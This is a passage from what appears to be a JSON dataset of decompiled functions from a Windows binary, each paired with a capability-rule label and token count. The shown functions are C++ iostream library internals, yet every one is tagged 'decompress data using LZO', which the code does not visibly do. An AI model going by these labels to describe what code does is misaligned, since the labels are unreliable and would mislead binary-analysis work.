fcn.004512b0();\n                    var_29h._0_1_ = 0x20;\n                    if (*(*piVar2 + 0x18) != 0x451560) {\n                        var_29h._0_1_ = (**(*piVar2 + 0x18))(0x20);\n                    }\n                }\n                else {\n                    var_29h._0_1_ = *(piVar2 + 0x3d);\n                }\n                *(iVar5 + 0x75) = 1;\n                *(iVar5 + 0x74) = var_29h;\n                iVar4 = *(*arg_8h + -0xc);\n                goto code_r0x004bd7e8;\n            }\ncode_r0x004bda7c:\n            uVar10 = fcn.004bde60();\n            uVar6 = uVar10;\n            if (uVar10 >> 0x20 == 1) {\n                fcn.004c2e40(uVar6);\n                arg_8h = arg_8h + *(*arg_8h + -0xc);\n                arg_8h[5] = arg_8h[5] | 1;\n                if ((*(arg_8h + 4) & 1) == 0) goto code_r0x004bdabd;\n                fcn.004c32d0();\n            }\n            fcn.004c2e40(uVar6);\n            iVar5 = *(*arg_8h + -0xc);\n            puVar1 = arg_8h + iVar5 + 0x14;\n            *puVar1 = *puVar1 | 1;\n            if ((*(arg_8h + iVar5 + 0x10) & 1) != 0) {\n                fcn.004c32d0();\ncode_r0x004bdabd:\n                uVar6 = fcn.004c32d0();\n                fcn.004c2fb0();\n                do {\n                    fcn.004899a0();\n                    uVar6 = fcn.0043a8e0(uVar6);\n                } while( true );\n            }\n            fcn.004c2fb0();\n            goto code_r0x004bd837;\n        }\ncode_r0x004bd8c3:\n        iVar4 = *(iVar5 + 0x14);\njoined_r0x004bd828:\n        if (iVar4 == 0) {\n            iVar5 = (**(**(iVar5 + 0x78) + 0x30))(arg_ch, arg_10h);\n            iVar4 = *(*arg_8h + -0xc);\n            if (arg_10h != iVar5) {\n                fcn.004bbce0();\n                iVar4 = *(*arg_8h + -0xc);\n            }\n            iVar5 = arg_8h + iVar4;\n            if ((uVar7 == 0x20) && (*(iVar5 + 0x14) == 0)) {\n                iVar9 = iVar9 - arg_10h;\n                if (*(iVar5 + 0x75) == '\\0') {\n                    piVar2 = *(iVar5 + 0x7c);\n                    if (piVar2 == NULL) {\n                        fcn.004bde60();\n                        goto code_r0x004bda7c;\n                    }\n                    if (*(piVar2 + 7) == '\\0') {\n                        fcn.004512b0();\n                        var_29h._0_1_ = 0x20;\n                        if (*(*piVar2 + 0x18) != 0x451560) {\n                            var_29h._0_1_ = (**(*piVar2 + 0x18))(0x20);\n                        }\n                    }\n                    else {\n                        var_29h._0_1_ = *(piVar2 + 0x3d);\n                    }\n                    *(iVar5 + 0x75) = 1;\n                    *(iVar5 + 0x74) = var_29h;\n                    iVar4 = *(*arg_8h + -0xc);\n                }\n                else {\n                    var_29h._0_1_ = *(iVar5 + 0x74);\n                }\n                do {\n                    piVar2 = *(arg_8h + iVar4 + 0x78);\n                    if (piVar2[5] < piVar2[6]) {\n                        *piVar2[5] = var_29h;\n                        piVar2[5] = piVar2[5] + 1;\n                    }\n                    else {\n                        iVar5 = (**(*piVar2 + 0x34))(var_29h);\n                        if (iVar5 == -1) {\n                            fcn.004bbce0(*(arg_8h + *(*arg_8h + -0xc) + 0x14) | 1);\n                            goto code_r0x004bd8a4;\n                        }\n                    }\n                    iVar4 = *(*arg_8h + -0xc);\n                    iVar9 = iVar9 + -1;\n                } while (iVar9 != 0);\n                iVar5 = arg_8h + iVar4;\n            }\n        }\n    }\n    else {\n        iVar9 = (**(**(iVar5 + 0x78) + 0x30))(arg_ch, arg_10h);\n        iVar5 = *(*arg_8h + -0xc) + arg_8h;\n        if (arg_10h != iVar9) {\n            fcn.004bbce0(*(iVar5 + 0x14) | 1);\ncode_r0x004bd8a4:\n            *(arg_8h + *(*arg_8h + -0xc) + 8) = 0;\n            goto code_r0x004bd837;\n        }\n    }\n    *(iVar5 + 8) = 0;\ncode_r0x004bd837:\n    iVar5 = *(*var_1ch + -0xc);\n    if (((((*(var_1ch + iVar5 + 0xd) & 0x20) != 0) && (cVar3 = fcn.004bdfd0(),  cVar3 == '\\0')) &&\n        (piVar2 = *(var_1ch + iVar5 + 0x78),  piVar2 != NULL)) && (iVar5 = (**(*piVar2 + 0x18))(),  iVar5 == -1)) {\n        fcn.004bbce0(*(var_1ch + *(*var_1ch + -0xc) + 0x14) | 1);\n    }\n    return arg_8h;\n}\n",
        "token_count": 2079
    },
    "004bdb00": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Type propagation algorithm not settling\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.004bdb00(int32_t *arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    int16_t *piVar3;\n    char cVar4;\n    int16_t iVar5;\n    int16_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint uVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    ulong uVar12;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    \n    fcn.0049f5a0(arg_8h);\n    if (var_20h == '\\0') goto code_r0x004bdbe7;\n    iVar10 = *(*arg_8h + -0xc) + arg_8h;\n    iVar7 = *(iVar10 + 8);\n    if (arg_10h < iVar7) {\n        uVar11 = *(iVar10 + 0xc) & 0xb0;\n        if (uVar11 != 0x20) {\n            var_2ch = iVar7 - arg_10h;\n            if (*(iVar10 + 0x76) != '\\0') {\n                iVar6 = *(iVar10 + 0x74);\ncode_r0x004bdb8b:\n                do {\n                    piVar2 = *(iVar10 + 0x78);\n                    piVar3 = piVar2[5];\n                    if (piVar3 < piVar2[6]) {\n                        *piVar3 = iVar6;\n                        piVar2[5] = piVar3 + 1;\n                        iVar5 = iVar6;\n                    }\n                    else {\n                        iVar5 = (**(*piVar2 + 0x34))(iVar6);\n                        iVar10 = *(*arg_8h + -0xc) + arg_8h;\n                    }\n                    if (iVar5 == -1) {\n                        fcn.004bc500(*(iVar10 + 0x14) | 1);\n                        iVar10 = *(*arg_8h + -0xc) + arg_8h;\n                        iVar8 = *(iVar10 + 0x14);\n                        goto joined_r0x004bdbd4;\n                    }\n                    var_2ch = var_2ch + -1;\n                } while (var_2ch != 0);\n                iVar8 = *(iVar10 + 0x14);\n                goto joined_r0x004bdbd4;\n            }\n            if (*(iVar10 + 0x7c) != NULL) {\n                iVar6 = (**(**(iVar10 + 0x7c) + 0x28))(0x20);\n                *(iVar10 + 0x74) = iVar6;\n                iVar8 = *arg_8h;\n                *(iVar10 + 0x76) = 1;\n                iVar10 = *(iVar8 + -0xc) + arg_8h;\n                goto code_r0x004bdb8b;\n            }\n            fcn.004bde60();\ncode_r0x004bddea:\n            uVar12 = fcn.004bde60();\n            uVar9 = uVar12;\n            if (uVar12 >> 0x20 == 1) {\n                fcn.004c2e40(uVar9);\n                arg_8h = arg_8h + *(*arg_8h + -0xc);\n                arg_8h[5] = arg_8h[5] | 1;\n                if ((*(arg_8h + 4) & 1) == 0) goto code_r0x004bde2b;\n                fcn.004c32d0();\n            }\n            fcn.004c2e40(uVar9);\n            iVar7 = *(*arg_8h + -0xc);\n            puVar1 = arg_8h + iVar7 + 0x14;\n            *puVar1 = *puVar1 | 1;\n            if ((*(arg_8h + iVar7 + 0x10) & 1) != 0) {\n                fcn.004c32d0();\ncode_r0x004bde2b:\n                uVar9 = fcn.004c32d0();\n                fcn.004c2fb0();\n                do {\n                    fcn.0049f660();\n                    uVar9 = fcn.0043a8e0(uVar9);\n                } while( true );\n            }\n            fcn.004c2fb0();\n            goto code_r0x004bdbe7;\n        }\n        iVar8 = *(iVar10 + 0x14);\njoined_r0x004bdbd4:\n        if (iVar8 == 0) {\n            iVar8 = (**(**(iVar10 + 0x78) + 0x30))(arg_ch, arg_10h);\n            iVar10 = *(*arg_8h + -0xc);\n            if (arg_10h != iVar8) {\n                fcn.004bc500();\n                iVar10 = *(*arg_8h + -0xc);\n            }\n            iVar10 = iVar10 + arg_8h;\n            if ((uVar11 == 0x20) && (*(iVar10 + 0x14) == 0)) {\n                var_2ch = iVar7 - arg_10h;\n                if (*(iVar10 + 0x76) == '\\0') {\n                    if (*(iVar10 + 0x7c) == NULL) goto code_r0x004bddea;\n                    iVar6 = (**(**(iVar10 + 0x7c) + 0x28))(0x20);\n                    *(iVar10 + 0x74) = iVar6;\n                    iVar7 = *arg_8h;\n                    *(iVar10 + 0x76) = 1;\n                    iVar10 = *(iVar7 + -0xc) + arg_8h;\n                }\n                else {\n                    iVar6 = *(iVar10 + 0x74);\n                }\n                do {\n                    piVar2 = *(iVar10 + 0x78);\n                    piVar3 = piVar2[5];\n                    if (piVar3 < piVar2[6]) {\n                        *piVar3 = iVar6;\n                        piVar2[5] = piVar3 + 1;\n                        iVar5 = iVar6;\n                    }\n                    else {\n                        iVar5 = (**(*piVar2 + 0x34))(iVar6);\n                        iVar10 = *(*arg_8h + -0xc) + arg_8h;\n                    }\n                    if (iVar5 == -1) {\n                        fcn.004bc500(*(iVar10 + 0x14) | 1);\n                        goto code_r0x004bdc56;\n                    }\n                    var_2ch = var_2ch + -1;\n                } while (var_2ch != 0);\n            }\n        }\n    }\n    else {\n        iVar7 = (**(**(iVar10 + 0x78) + 0x30))(arg_ch, arg_10h);\n        iVar10 = *(*arg_8h + -0xc) + arg_8h;\n        if (arg_10h != iVar7) {\n            fcn.004bc500(*(iVar10 + 0x14) | 1);\ncode_r0x004bdc56:\n            *(arg_8h + *(*arg_8h + -0xc) + 8) = 0;\n            goto code_r0x004bdbe7;\n        }\n    }\n    *(iVar10 + 8) = 0;\ncode_r0x004bdbe7:\n    iVar7 = *(*var_1ch + -0xc);\n    if (((((*(var_1ch + iVar7 + 0xd) & 0x20) != 0) && (cVar4 = fcn.004bdfd0(),  cVar4 == '\\0')) &&\n        (piVar2 = *(var_1ch + iVar7 + 0x78),  piVar2 != NULL)) && (iVar7 = (**(*piVar2 + 0x18))(),  iVar7 == -1)) {\n        fcn.004bc500(*(var_1ch + *(*var_1ch + -0xc) + 0x14) | 1);\n    }\n    return arg_8h;\n}\n",
        "token_count": 1883
    },
    "004bdff0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004bdff0(uint s)\n\n{\n    int32_t **ppiVar1;\n    uint *puVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    uint uVar5;\n    int32_t **ppiVar6;\n    code *pcVar7;\n    int32_t iVar8;\n    int32_t **ppiVar9;\n    int32_t *piVar10;\n    int32_t *piVar11;\n    int32_t *piVar12;\n    uint *var_70h;\n    uint var_6ch;\n    uint *var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint *var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t *var_30h;\n    int32_t *var_2ch;\n    int32_t *var_28h;\n    \n    puVar2 = fcn.004c2d80(0x18);\n    piVar3 = fcn.00448200();\n    pcVar7 = *(*piVar3 + 0x10);\n    if (pcVar7 != fcn.0044ab10) goto code_r0x004be19b;\n    var_60h = &var_58h;\n    var_58h._0_1_ = 0;\n    fcn.004afdd0(0, 0, \"iostream error\", 0xe);\n    do {\n        var_70h = &var_58h;\n        piVar4 = fcn.004afdd0(0, 0, 0x526a3b, 2);\n        var_48h = &var_40h;\n        piVar11 = piVar4 + 2;\n        if (*piVar4 == piVar11) {\n            piVar10 = piVar11;\n            piVar12 = &var_40h;\n            for (iVar8 = 4; iVar8 != 0; iVar8 = iVar8 + -1) {\n                *piVar12 = *piVar10;\n                piVar10 = piVar10 + 1;\n                piVar12 = piVar12 + 1;\n            }\n        }\n        else {\n            var_40h = piVar4[2];\n            var_48h = *piVar4;\n        }\n        var_44h = piVar4[1];\n        *(piVar4 + 2) = 0;\n        *piVar4 = piVar11;\n        piVar4[1] = 0;\n        uVar5 = sub.msvcrt.dll_strlen(s);\n        ppiVar6 = fcn.004afdd0(0, 0, s, uVar5);\n        var_30h = &var_28h;\n        ppiVar1 = ppiVar6 + 2;\n        if (*ppiVar6 == ppiVar1) {\n            ppiVar9 = ppiVar1;\n            piVar11 = var_30h;\n            for (iVar8 = 4; iVar8 != 0; iVar8 = iVar8 + -1) {\n                *piVar11 = *ppiVar9;\n                ppiVar9 = ppiVar9 + 1;\n                piVar11 = piVar11 + 1;\n            }\n        }\n        else {\n            var_28h = ppiVar6[2];\n            var_30h = *ppiVar6;\n        }\n        var_2ch = ppiVar6[1];\n        *(ppiVar6 + 2) = 0;\n        *ppiVar6 = ppiVar1;\n        ppiVar6[1] = NULL;\n        fcn.004a0d40(&var_30h);\n        if (var_30h != &var_28h) {\n            fcn.004c2c30(var_30h);\n        }\n        if (var_48h != &var_40h) {\n            fcn.004c2c30(var_48h);\n        }\n        if (var_60h != var_70h) {\n            fcn.004c2c30(var_60h);\n        }\n        puVar2[2] = 1;\n        *puVar2 = 0x52c0a0;\n        puVar2[3] = piVar3;\n        uVar5 = fcn.0044fce0();\n        fcn.004be7c0(puVar2 + 4, uVar5);\n        pcVar7 = fcn.004c3330(puVar2, 0x52892c, 0x4960b0);\ncode_r0x004be19b:\n        (*pcVar7)(piVar3, 1);\n    } while( true );\n}\n",
        "token_count": 1055
    },
    "004be210": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004be210(uint arg_8h)\n\n{\n    uchar *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint extraout_ECX;\n    char unaff_DI;\n    ulong uVar6;\n    int32_t in_stack_00000020;\n    \n    iVar4 = fcn.004c2d80(8);\n    fcn.0048f5f0(arg_8h);\n    uVar5 = fcn.004c3330(iVar4, 0x5288c4, fcn.0048f6f0);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    uVar6 = fcn.004c33a0();\n    if (uVar6 >> 0x20 != 1) {\n        fcn.0043a8e0(uVar6);\n    }\n    fcn.004c2e40();\n    fcn.004c2fb0();\n    uVar2 = *(iVar4 + 0x14) | 1;\n    *(iVar4 + 0x14) = uVar2;\n    if ((*(iVar4 + 0x10) & uVar2) == 0) {\n        if (unaff_DI == '\\0') {\n            *(iVar4 + 0x1c) = 0;\n        }\n        else {\n            *(iVar4 + 0x20) = 0;\n        }\n        return iVar4 + 0x1c;\n    }\n    iVar3 = fcn.004bdff0(\"ios_base::_M_grow_words allocation failed\");\n    puVar1 = *(iVar4 + 0x68);\n    uVar5 = extraout_ECX;\n    if ((puVar1 != &stack0xfffffffc) && (puVar1 != NULL)) {\n        fcn.004c2c20(puVar1);\n    }\n    *(iVar4 + 0x68) = iVar3;\n    *(iVar4 + 100) = uVar5;\n    return iVar3 + in_stack_00000020 * 8;\n}\n",
        "token_count": 717
    },
    "004be260": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004be260(uint arg_8h)\n\n{\n    uchar *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint extraout_ECX;\n    char unaff_DI;\n    ulong uVar6;\n    int32_t in_stack_00000020;\n    \n    iVar4 = fcn.004c2d80(8);\n    fcn.0048f780(arg_8h);\n    uVar5 = fcn.004c3330(iVar4, 0x5288d0, fcn.0048f830);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    uVar6 = fcn.004c33a0();\n    if (uVar6 >> 0x20 != 1) {\n        fcn.0043a8e0(uVar6);\n    }\n    fcn.004c2e40();\n    fcn.004c2fb0();\n    uVar2 = *(iVar4 + 0x14) | 1;\n    *(iVar4 + 0x14) = uVar2;\n    if ((*(iVar4 + 0x10) & uVar2) == 0) {\n        if (unaff_DI == '\\0') {\n            *(iVar4 + 0x1c) = 0;\n        }\n        else {\n            *(iVar4 + 0x20) = 0;\n        }\n        return iVar4 + 0x1c;\n    }\n    iVar3 = fcn.004bdff0(\"ios_base::_M_grow_words allocation failed\");\n    puVar1 = *(iVar4 + 0x68);\n    uVar5 = extraout_ECX;\n    if ((puVar1 != &stack0xfffffffc) && (puVar1 != NULL)) {\n        fcn.004c2c20(puVar1);\n    }\n    *(iVar4 + 0x68) = iVar3;\n    *(iVar4 + 100) = uVar5;\n    return iVar3 + in_stack_00000020 * 8;\n}\n",
        "token_count": 531
    },
    "004be2c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004be2c0(uint arg_8h)\n\n{\n    uchar *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint extraout_ECX;\n    char unaff_DI;\n    ulong uVar6;\n    int32_t in_stack_00000020;\n    \n    iVar4 = fcn.004c2d80(8);\n    fcn.00490b90(arg_8h);\n    uVar5 = fcn.004c3330(iVar4, 0x5288fc, fcn.00490c40);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    uVar6 = fcn.004c33a0();\n    if (uVar6 >> 0x20 != 1) {\n        fcn.0043a8e0(uVar6);\n    }\n    fcn.004c2e40();\n    fcn.004c2fb0();\n    uVar2 = *(iVar4 + 0x14) | 1;\n    *(iVar4 + 0x14) = uVar2;\n    if ((*(iVar4 + 0x10) & uVar2) == 0) {\n        if (unaff_DI == '\\0') {\n            *(iVar4 + 0x1c) = 0;\n        }\n        else {\n            *(iVar4 + 0x20) = 0;\n        }\n        return iVar4 + 0x1c;\n    }\n    iVar3 = fcn.004bdff0(\"ios_base::_M_grow_words allocation failed\");\n    puVar1 = *(iVar4 + 0x68);\n    uVar5 = extraout_ECX;\n    if ((puVar1 != &stack0xfffffffc) && (puVar1 != NULL)) {\n        fcn.004c2c20(puVar1);\n    }\n    *(iVar4 + 0x68) = iVar3;\n    *(iVar4 + 100) = uVar5;\n    return iVar3 + in_stack_00000020 * 8;\n}\n",
        "token_count": 688
    },
    "004be310": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.004be310(uint param_1)\n\n{\n    uchar *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint extraout_ECX;\n    char unaff_DI;\n    ulong uVar6;\n    int32_t in_stack_00000020;\n    \n    iVar4 = fcn.004c2d80(8);\n    fcn.00490c50(param_1);\n    uVar5 = fcn.004c3330(iVar4, 0x528908, fcn.00490d00);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    uVar6 = fcn.004c33a0();\n    if (uVar6 >> 0x20 != 1) {\n        fcn.0043a8e0(uVar6);\n    }\n    fcn.004c2e40();\n    fcn.004c2fb0();\n    uVar2 = *(iVar4 + 0x14) | 1;\n    *(iVar4 + 0x14) = uVar2;\n    if ((*(iVar4 + 0x10) & uVar2) == 0) {\n        if (unaff_DI == '\\0') {\n            *(iVar4 + 0x1c) = 0;\n        }\n        else {\n            *(iVar4 + 0x20) = 0;\n        }\n        return iVar4 + 0x1c;\n    }\n    iVar3 = fcn.004bdff0(\"ios_base::_M_grow_words allocation failed\");\n    puVar1 = *(iVar4 + 0x68);\n    uVar5 = extraout_ECX;\n    if ((puVar1 != &stack0xfffffffc) && (puVar1 != NULL)) {\n        fcn.004c2c20(puVar1);\n    }\n    *(iVar4 + 0x68) = iVar3;\n    *(iVar4 + 100) = uVar5;\n    return iVar3 + in_stack_00000020 * 8;\n}\n",
        "token_count": 629
    },
    "004be360": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004be360(uint arg_8h)\n\n{\n    uchar *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint extraout_ECX;\n    char unaff_DI;\n    ulong uVar6;\n    int32_t in_stack_00000020;\n    \n    iVar4 = fcn.004c2d80(8);\n    fcn.00490d10(arg_8h);\n    uVar5 = fcn.004c3330(iVar4, 0x528914, fcn.00490dc0);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    uVar6 = fcn.004c33a0();\n    if (uVar6 >> 0x20 != 1) {\n        fcn.0043a8e0(uVar6);\n    }\n    fcn.004c2e40();\n    fcn.004c2fb0();\n    uVar2 = *(iVar4 + 0x14) | 1;\n    *(iVar4 + 0x14) = uVar2;\n    if ((*(iVar4 + 0x10) & uVar2) == 0) {\n        if (unaff_DI == '\\0') {\n            *(iVar4 + 0x1c) = 0;\n        }\n        else {\n            *(iVar4 + 0x20) = 0;\n        }\n        return iVar4 + 0x1c;\n    }\n    iVar3 = fcn.004bdff0(\"ios_base::_M_grow_words allocation failed\");\n    puVar1 = *(iVar4 + 0x68);\n    uVar5 = extraout_ECX;\n    if ((puVar1 != &stack0xfffffffc) && (puVar1 != NULL)) {\n        fcn.004c2c20(puVar1);\n    }\n    *(iVar4 + 0x68) = iVar3;\n    *(iVar4 + 100) = uVar5;\n    return iVar3 + in_stack_00000020 * 8;\n}\n",
        "token_count": 607
    },
    "004be3b0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004be3b0(uint arg_8h)\n\n{\n    uint *puVar1;\n    uint *var_30h;\n    uint var_28h;\n    \n    puVar1 = fcn.004c2d80(0x10);\n    fcn.0044abc0(0x5168e8, arg_8h);\n    fcn.004a0d40(&var_30h);\n    if (var_30h != &var_28h) {\n        fcn.004c2c30(var_30h);\n    }\n    *puVar1 = 0x52c08c;\n    puVar1[2] = arg_8h;\n    puVar1[3] = 0x5168e8;\n    fcn.004c3330(puVar1, 0x528920, fcn.00490df0);\n    if (var_30h != &var_28h) {\n        fcn.004c2c30(var_30h);\n    }\n    fcn.004c3080(puVar1);\n    fcn.0043a8e0(&var_30h);\n    fcn.004014c0(0x4c3bb0);\n    fcn.004014c0(0x4c3bc0);\n    return;\n}\n",
        "token_count": 295
    },
    "004be420": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.004be420(int32_t *param_1, int32_t *param_2, uchar *param_3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    uint8_t *puVar5;\n    int32_t iVar6;\n    uint var_14h;\n    uint var_18h;\n    \n    puVar3 = param_1[2];\n    puVar5 = param_1[3];\n    *param_3 = 1;\n    if (puVar3 < puVar5) {\n        uVar1 = *puVar3;\n    }\n    else {\n        uVar1 = (**(*param_1 + 0x24))();\n        if (uVar1 == 0xffffffff) {\n            return 0;\n        }\n        puVar5 = param_1[3];\n        puVar3 = param_1[2];\n    }\n    iVar6 = 0;\ncode_r0x004be450:\n    iVar4 = puVar5 - puVar3;\n    if (iVar4 < 2) goto code_r0x004be48b;\n    do {\n        iVar2 = (**(*param_2 + 0x30))(puVar3, iVar4);\n        param_1[2] = param_1[2] + iVar2;\n        iVar6 = iVar6 + iVar2;\n        if (iVar2 < iVar4) {\ncode_r0x004be4e6:\n            *param_3 = 0;\n            return iVar6;\n        }\n        while( true ) {\n            uVar1 = (**(*param_1 + 0x24))();\n            if (uVar1 == 0xffffffff) {\n                return iVar6;\n            }\n            puVar3 = param_1[2];\n            iVar4 = param_1[3] - puVar3;\n            if (1 < iVar4) break;\ncode_r0x004be48b:\n            if (param_2[5] < param_2[6]) {\n                *param_2[5] = uVar1;\n                param_2[5] = param_2[5] + 1;\n            }\n            else {\n                iVar4 = (**(*param_2 + 0x34))(uVar1 & 0xff);\n                if (iVar4 == -1) goto code_r0x004be4e6;\n            }\n            puVar5 = param_1[3];\n            iVar6 = iVar6 + 1;\n            if (param_1[2] < puVar5) {\n                puVar3 = param_1[2] + 1;\n                param_1[2] = puVar3;\n            }\n            else {\n                iVar4 = (**(*param_1 + 0x28))();\n                if (iVar4 == -1) {\n                    return iVar6;\n                }\n                puVar3 = param_1[2];\n                puVar5 = param_1[3];\n            }\n            if (puVar3 < puVar5) {\n                uVar1 = *puVar3;\n                goto code_r0x004be450;\n            }\n        }\n    } while( true );\n}\n",
        "token_count": 701
    },
    "004be520": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.004be520(int32_t *param_1, int32_t *param_2, uchar *param_3)\n\n{\n    int16_t *piVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_14h;\n    uint var_18h;\n    \n    *param_3 = 1;\n    piVar1 = param_1[2];\n    if (param_1[3] < piVar1 || param_1[3] == piVar1) {\n        iVar2 = (**(*param_1 + 0x24))();\n    }\n    else {\n        iVar2 = *piVar1;\n    }\n    iVar5 = 0;\n    do {\n        while( true ) {\n            if (iVar2 == -1) {\n                return iVar5;\n            }\n            iVar4 = param_1[3] - param_1[2];\n            if (iVar4 < 3) break;\n            iVar4 = iVar4 >> 1;\n            iVar3 = (**(*param_2 + 0x30))(param_1[2], iVar4);\n            param_1[2] = param_1[2] + iVar3 * 2;\n            iVar5 = iVar5 + iVar3;\n            if (iVar3 < iVar4) {\ncode_r0x004be5e7:\n                *param_3 = 0;\n                return iVar5;\n            }\ncode_r0x004be570:\n            iVar2 = (**(*param_1 + 0x24))();\n        }\n        piVar1 = param_2[5];\n        if (piVar1 < param_2[6]) {\n            *piVar1 = iVar2;\n            param_2[5] = piVar1 + 1;\n        }\n        else {\n            iVar2 = (**(*param_2 + 0x34))(iVar2);\n            if (iVar2 == -1) goto code_r0x004be5e7;\n        }\n        iVar5 = iVar5 + 1;\n        piVar1 = param_1[2];\n        if (piVar1 < param_1[3]) {\n            iVar2 = *piVar1;\n            param_1[2] = piVar1 + 1;\n        }\n        else {\n            iVar2 = (**(*param_1 + 0x28))();\n        }\n        if (iVar2 == -1) {\n            return iVar5;\n        }\n        if (param_1[3] <= param_1[2]) goto code_r0x004be570;\n        iVar2 = *param_1[2];\n    } while( true );\n}\n",
        "token_count": 587
    },
    "004be660": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004be660(uint arg_8h)\n\n{\n    uchar *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint extraout_ECX;\n    char unaff_DI;\n    ulong uVar6;\n    int32_t in_stack_00000020;\n    \n    iVar4 = fcn.004c2d80(8);\n    fcn.004a0d00(arg_8h);\n    uVar5 = fcn.004c3330(iVar4, 0x5289ac, fcn.004a0e00);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    uVar6 = fcn.004c33a0();\n    if (uVar6 >> 0x20 != 1) {\n        fcn.0043a8e0(uVar6);\n    }\n    fcn.004c2e40();\n    fcn.004c2fb0();\n    uVar2 = *(iVar4 + 0x14) | 1;\n    *(iVar4 + 0x14) = uVar2;\n    if ((*(iVar4 + 0x10) & uVar2) == 0) {\n        if (unaff_DI == '\\0') {\n            *(iVar4 + 0x1c) = 0;\n        }\n        else {\n            *(iVar4 + 0x20) = 0;\n        }\n        